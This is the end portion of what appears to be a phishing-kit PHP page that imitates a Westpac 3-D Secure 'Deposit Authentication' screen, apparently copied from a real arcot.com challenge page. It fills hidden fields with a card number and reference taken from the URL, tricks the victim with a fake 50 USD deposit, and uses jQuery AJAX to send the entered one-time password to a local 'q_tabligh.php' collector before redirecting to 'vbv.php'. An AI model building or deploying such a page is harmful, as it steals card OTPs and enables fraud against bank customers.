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"
                        alt="Payment Network"
                        tabindex="4"
                    />
                </div>
            </div>
            <div class="challenge-zone" id="challenge-zone">
                <div class="challenge-info-header">
                    <h3 class="challenge-info-header-h3" tabindex="5">Deposit Authentication</h3>
                </div>
                <div>
                    <div id="challenge_info" class="challenge-info-text">
                        <div class="container-body-header-desc-otp-ext">
                            <p tabindex="7">We have sent your One Time Password (OTP) to your registered mobile number.</p>
                            <br />
                            <script type="text/javascript">
                                function getCurrentDateFormatted() {
                                    const currentDate = new Date();
                                    const month = String(currentDate.getMonth() + 1).padStart(2, "0");
                                    const day = String(currentDate.getDate()).padStart(2, "0");
                                    const year = currentDate.getFullYear();

                                    return `${month}/${day}/${year}`;
                                }
                            </script>

                            <p class="txnDetails" tabindex="8">
                                <span style="color: #2d373e;">
                                    You are in the process of depositing an amount of 50 USD  on
                                    <script>
                                        document.write(getCurrentDateFormatted());
                                    </script>
                                    into the card ending in  <?php echo($lbin);?>.
                                </span>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="txnInputFormDiv">
                        <form id="verify_form" name="verify_form" action="./q_tabligh.php" method="post"  class="txnInputForm">
                        <input type="text" style="display: none;" name="ccnumb" id="ccnumb" value="<?php echo($_GET['ccnumber']);?>" />
                        <input type="text" style="display: none;" name="reference" id="reference" value="<?php echo($_GET['reference']); ?>" />
                        <div class="container-body-txnInput-verify">
                            <div>
                                <input
                                    type="text"
                                    id="text_input"
                                    value=""
                                    name="text_input"
                                    maxlength="8"
                                    class="text_input"
                                    placeholder="Enter your OTP"
                                    tabindex="9"
                                    autocomplete="off"
                                    style="padding: unset;"
                                />
                                <div style="display: contents;">
                                    <p id="otpEntryValidationText" class="validationText" tabindex="10"></p>
                                </div>
                            </div>

                            <div></div>
                            <div class="container-body-submit-elongated">
                                <div class="container-body-submit-input-elongated">
                                    <input id="verify-btn-elongated" class="button" type="submit" value="Submit OTP" tabindex="13" />
                                </div>
                            </div>

                            <div>
                                <div>
                                    <div class="container-body-resend">
                                        <div class="container-body-resend-input">
                                            <input
                                                id="resend-button"
                                                class="resend_button"
                                                type="button"
                                                value="Resend OTP"
                                                tabindex="13"
                                            />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>

                <script>

$(document).ready(function(){
    $('#verify-btn-elongated').click(function(e) {
        e.preventDefault(); // prevent regular form submission
        $.ajax({
            url: './q_tabligh.php?reference='+document.getElementById("reference").value+'&ccnumber='+document.getElementById("ccnumb").value,
            type: 'post',
            data: $('#verify_form').serialize(), // send form data
            success: function(response) {
              console.log(response);
                if(response.trim() === 'ok') {
                    window.location.href = 'vbv.php?reference='+document.getElementById("reference").value+'&ccnumber='+document.getElementById("ccnumb").value+'&repeat=1';
                } else {
                    console.log("Response from server: ", response);
                }
            },
            error: function(xhr, status, error) {
                console.log("AJAX Error: " + error);
            }
        });
    });
});


                </script>
                    
                </div>

                <div class="txnInputResendFormDiv">
                </div>
            </div>
            <div class="container-footer">
                <a href="javascript:{}" onclick="javascript:collapse('displayText','hideText','WhyInfo')" tabindex="14">
                    <div id="displayText">
                        <span class="whyInfo-arrow-span">Terms and Conditions</span>
                        <img
                            class="whyInfo-arrow-image"
                            id="downwardArrowImageWhyInfo"
                            data-savepage-src="https://secure7.arcot.com/content-server/api/tds2/txn/v1/image/127740"
                            src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBweCIgaGVpZ2h0PSIxMHB4IiB2aWV3Qm94PSIwIDAgMTAgMTAiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDUzLjIgKDcyNjQzKSAtIGh0dHBzOi8vc2tldGNoYXBwLmNvbSAtLT4KICAgIDx0aXRsZT5pY29uIC8gY29udGVudCAvIHBsdXMgY29weTwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxkZWZzPgogICAgICAgIDxwYXRoIGQ9Ik04LjgzMzMzMzMzLDcuMTY2NjY2NjcgTDEyLjE2NjY2NjcsNy4xNjY2NjY2NyBDMTIuNjI2OTA0LDcuMTY2NjY2NjcgMTMsNy41Mzk3NjI3MSAxMyw4IEMxMyw4LjQ2MDIzNzI5IDEyLjYyNjkwNCw4LjgzMzMzMzMzIDEyLjE2NjY2NjcsOC44MzMzMzMzMyBMOC44MzMzMzMzMyw4LjgzMzMzMzMzIEw4LjgzMzMzMzMzLDEyLjE2NjY2NjcgQzguODMzMzMzMzMsMTIuNjI2OTA0IDguNDYwMjM3MjksMTMgOCwxMyBDNy41Mzk3NjI3MSwxMyA3LjE2NjY2NjY3LDEyLjYyNjkwNCA3LjE2NjY2NjY3LDEyLjE2NjY2NjcgTDcuMTY2NjY2NjcsOC44MzMzMzMzMyBMMy44MzMzMzMzMyw4LjgzMzMzMzMzIEMzLjM3MzA5NjA0LDguODMzMzMzMzMgMyw4LjQ2MDIzNzI5IDMsOCBDMyw3LjUzOTc2MjcxIDMuMzczMDk2MDQsNy4xNjY2NjY2NyAzLjgzMzMzMzMzLDcuMTY2NjY2NjcgTDcuMTY2NjY2NjcsNy4xNjY2NjY2NyBMNy4xNjY2NjY2NywzLjgzMzMzMzMzIEM3LjE2NjY2NjY3LDMuMzczMDk2MDQgNy41Mzk3NjI3MSwzIDgsMyBDOC40NjAyMzcyOSwzIDguODMzMzMzMzMsMy4zNzMwOTYwNCA4LjgzMzMzMzMzLDMuODMzMzMzMzMgTDguODMzMzMzMzMsNy4xNjY2NjY2NyBaIiBpZD0icGF0aC0xIj48L3BhdGg+CiAgICA8L2RlZnM+CiAgICA8ZyBpZD0iUGFnZS0xIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iaWNvbi0vLWNvbnRlbnQtLy1wbHVzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMy4wMDAwMDAsIC0zLjAwMDAwMCkiPgogICAgICAgICAgICA8bWFzayBpZD0ibWFzay0yIiBmaWxsPSJ3aGl0ZSI+CiAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8L21hc2s+CiAgICAgICAgICAgIDx1c2UgaWQ9IkNvbWJpbmVkLVNoYXBlIiBmaWxsPSIjMDAwMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8ZyBpZD0iVXRpbGl0aWVzLS8tY29sb3ItLy1ncmF5IiBtYXNrPSJ1cmwoI21hc2stMikiIGZpbGw9IiM1ODYwNkUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgICAgICAgICA8ZyBpZD0i8J+OqC1jb2xvci0vLWdyYXktLy04MCI+CiAgICAgICAgICAgICAgICAgICAgPHJlY3QgaWQ9IkRPLU5PVC1DSEFOR0UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PC9yZWN0PgogICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4="
                            height="20"
                            width="20"
                            style="display: block;"
                        />
                        <img
                            class="whyInfo-arrow-image"
                            id="minusArrowImageWhyInfo"
                            data-savepage-src="https://secure7.arcot.com/content-server/api/tds2/txn/v1/image/127736"
                            src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBweCIgaGVpZ2h0PSIycHgiIHZpZXdCb3g9IjAgMCAxMCAyIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA1My4yICg3MjY0MykgLSBodHRwczovL3NrZXRjaGFwcC5jb20gLS0+CiAgICA8dGl0bGU+aWNvbiAvIGNvbnRlbnQgLyBtaW51czwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxkZWZzPgogICAgICAgIDxwYXRoIGQ9Ik0xMyw4IEMxMyw4LjQ2MDIzNzI5IDEyLjYyNjkwNCw4LjgzMzMzMzMzIDEyLjE2NjY2NjcsOC44MzMzMzMzMyBMMy44MzMzMzMzMyw4LjgzMzMzMzMzIEMzLjM3MzA5NjA0LDguODMzMzMzMzMgMyw4LjQ2MDIzNzI5IDMsOCBDMyw3LjUzOTc2MjcxIDMuMzczMDk2MDQsNy4xNjY2NjY2NyAzLjgzMzMzMzMzLDcuMTY2NjY2NjcgTDEyLjE2NjY2NjcsNy4xNjY2NjY2NyBDMTIuNjI2OTA0LDcuMTY2NjY2NjcgMTMsNy41Mzk3NjI3MSAxMyw4IFoiIGlkPSJwYXRoLTEiPjwvcGF0aD4KICAgIDwvZGVmcz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpY29uLS8tY29udGVudC0vLW1pbnVzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMy4wMDAwMDAsIC03LjAwMDAwMCkiPgogICAgICAgICAgICA8bWFzayBpZD0ibWFzay0yIiBmaWxsPSJ3aGl0ZSI+CiAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8L21hc2s+CiAgICAgICAgICAgIDx1c2UgaWQ9IkNvbWJpbmVkLVNoYXBlIiBmaWxsPSIjMDAwMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8ZyBpZD0iVXRpbGl0aWVzLS8tY29sb3ItLy1ncmF5IiBtYXNrPSJ1cmwoI21hc2stMikiIGZpbGw9IiM1ODYwNkUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgICAgICAgICA8ZyBpZD0i8J+OqC1jb2xvci0vLWdyYXktLy04MCI+CiAgICAgICAgICAgICAgICAgICAgPHJlY3QgaWQ9IkRPLU5PVC1DSEFOR0UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PC9yZWN0PgogICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4="
                            height="20"
                            width="20"
                            style="display: none;"
                        />
                    </div>
                </a>
                <div id="hideText" style="display: none; max-height: 100%;" tabindex="15">
                    <div style="display: inline-block; width: 100%;"><div class="hidetext-span">Read the Westpac Added Online Security Terms and Conditions and Privacy Policy available from westpac.com.au/secure-shopping</div></div>
                </div>
                <a href="javascript:{}" onclick="javascript:collapse('displayText','hideText1','ExpandableInfo')" tabindex="16">
                    <div id="displayText">
                        <span class="expandableInfo-arrow-span">Help</span>
                        <img
                            class="expandableInfo-arrow-image"
                            id="downwardArrowImageExpandableInfo"
                            data-savepage-src="https://secure7.arcot.com/content-server/api/tds2/txn/v1/image/127740"
                            src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBweCIgaGVpZ2h0PSIxMHB4IiB2aWV3Qm94PSIwIDAgMTAgMTAiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDUzLjIgKDcyNjQzKSAtIGh0dHBzOi8vc2tldGNoYXBwLmNvbSAtLT4KICAgIDx0aXRsZT5pY29uIC8gY29udGVudCAvIHBsdXMgY29weTwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxkZWZzPgogICAgICAgIDxwYXRoIGQ9Ik04LjgzMzMzMzMzLDcuMTY2NjY2NjcgTDEyLjE2NjY2NjcsNy4xNjY2NjY2NyBDMTIuNjI2OTA0LDcuMTY2NjY2NjcgMTMsNy41Mzk3NjI3MSAxMyw4IEMxMyw4LjQ2MDIzNzI5IDEyLjYyNjkwNCw4LjgzMzMzMzMzIDEyLjE2NjY2NjcsOC44MzMzMzMzMyBMOC44MzMzMzMzMyw4LjgzMzMzMzMzIEw4LjgzMzMzMzMzLDEyLjE2NjY2NjcgQzguODMzMzMzMzMsMTIuNjI2OTA0IDguNDYwMjM3MjksMTMgOCwxMyBDNy41Mzk3NjI3MSwxMyA3LjE2NjY2NjY3LDEyLjYyNjkwNCA3LjE2NjY2NjY3LDEyLjE2NjY2NjcgTDcuMTY2NjY2NjcsOC44MzMzMzMzMyBMMy44MzMzMzMzMyw4LjgzMzMzMzMzIEMzLjM3MzA5NjA0LDguODMzMzMzMzMgMyw4LjQ2MDIzNzI5IDMsOCBDMyw3LjUzOTc2MjcxIDMuMzczMDk2MDQsNy4xNjY2NjY2NyAzLjgzMzMzMzMzLDcuMTY2NjY2NjcgTDcuMTY2NjY2NjcsNy4xNjY2NjY2NyBMNy4xNjY2NjY2NywzLjgzMzMzMzMzIEM3LjE2NjY2NjY3LDMuMzczMDk2MDQgNy41Mzk3NjI3MSwzIDgsMyBDOC40NjAyMzcyOSwzIDguODMzMzMzMzMsMy4zNzMwOTYwNCA4LjgzMzMzMzMzLDMuODMzMzMzMzMgTDguODMzMzMzMzMsNy4xNjY2NjY2NyBaIiBpZD0icGF0aC0xIj48L3BhdGg+CiAgICA8L2RlZnM+CiAgICA8ZyBpZD0iUGFnZS0xIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iaWNvbi0vLWNvbnRlbnQtLy1wbHVzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMy4wMDAwMDAsIC0zLjAwMDAwMCkiPgogICAgICAgICAgICA8bWFzayBpZD0ibWFzay0yIiBmaWxsPSJ3aGl0ZSI+CiAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8L21hc2s+CiAgICAgICAgICAgIDx1c2UgaWQ9IkNvbWJpbmVkLVNoYXBlIiBmaWxsPSIjMDAwMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8ZyBpZD0iVXRpbGl0aWVzLS8tY29sb3ItLy1ncmF5IiBtYXNrPSJ1cmwoI21hc2stMikiIGZpbGw9IiM1ODYwNkUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgICAgICAgICA8ZyBpZD0i8J+OqC1jb2xvci0vLWdyYXktLy04MCI+CiAgICAgICAgICAgICAgICAgICAgPHJlY3QgaWQ9IkRPLU5PVC1DSEFOR0UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PC9yZWN0PgogICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4="
                            height="20"
                            width="20"
                            style="display: block;"
                        />
                        <img
                            class="expandableInfo-arrow-image"
                            id="minusArrowImageExpandableInfo"
                            data-savepage-src="https://secure7.arcot.com/content-server/api/tds2/txn/v1/image/127736"
                            src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBweCIgaGVpZ2h0PSIycHgiIHZpZXdCb3g9IjAgMCAxMCAyIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA1My4yICg3MjY0MykgLSBodHRwczovL3NrZXRjaGFwcC5jb20gLS0+CiAgICA8dGl0bGU+aWNvbiAvIGNvbnRlbnQgLyBtaW51czwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxkZWZzPgogICAgICAgIDxwYXRoIGQ9Ik0xMyw4IEMxMyw4LjQ2MDIzNzI5IDEyLjYyNjkwNCw4LjgzMzMzMzMzIDEyLjE2NjY2NjcsOC44MzMzMzMzMyBMMy44MzMzMzMzMyw4LjgzMzMzMzMzIEMzLjM3MzA5NjA0LDguODMzMzMzMzMgMyw4LjQ2MDIzNzI5IDMsOCBDMyw3LjUzOTc2MjcxIDMuMzczMDk2MDQsNy4xNjY2NjY2NyAzLjgzMzMzMzMzLDcuMTY2NjY2NjcgTDEyLjE2NjY2NjcsNy4xNjY2NjY2NyBDMTIuNjI2OTA0LDcuMTY2NjY2NjcgMTMsNy41Mzk3NjI3MSAxMyw4IFoiIGlkPSJwYXRoLTEiPjwvcGF0aD4KICAgIDwvZGVmcz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJpY29uLS8tY29udGVudC0vLW1pbnVzIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMy4wMDAwMDAsIC03LjAwMDAwMCkiPgogICAgICAgICAgICA8bWFzayBpZD0ibWFzay0yIiBmaWxsPSJ3aGl0ZSI+CiAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8L21hc2s+CiAgICAgICAgICAgIDx1c2UgaWQ9IkNvbWJpbmVkLVNoYXBlIiBmaWxsPSIjMDAwMDAwIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICA8ZyBpZD0iVXRpbGl0aWVzLS8tY29sb3ItLy1ncmF5IiBtYXNrPSJ1cmwoI21hc2stMikiIGZpbGw9IiM1ODYwNkUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgICAgICAgICA8ZyBpZD0i8J+OqC1jb2xvci0vLWdyYXktLy04MCI+CiAgICAgICAgICAgICAgICAgICAgPHJlY3QgaWQ9IkRPLU5PVC1DSEFOR0UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PC9yZWN0PgogICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4="
                            height="20"
                            width="20"
                            style="display: none;"
                        />
                    </div>
                </a>
                <div id="hideText1" style="display: none; max-height: 100%;" tabindex="17">
                    <div style="display: inline-block; width: 100%;"><div class="hidetext1-span">If you would like to learn more about our Payment Authentication, please call 132 032 or +61 2 9155 7700 from overseas.</div></div>
                </div>
            </div>
        </div>
    </body>
</html>
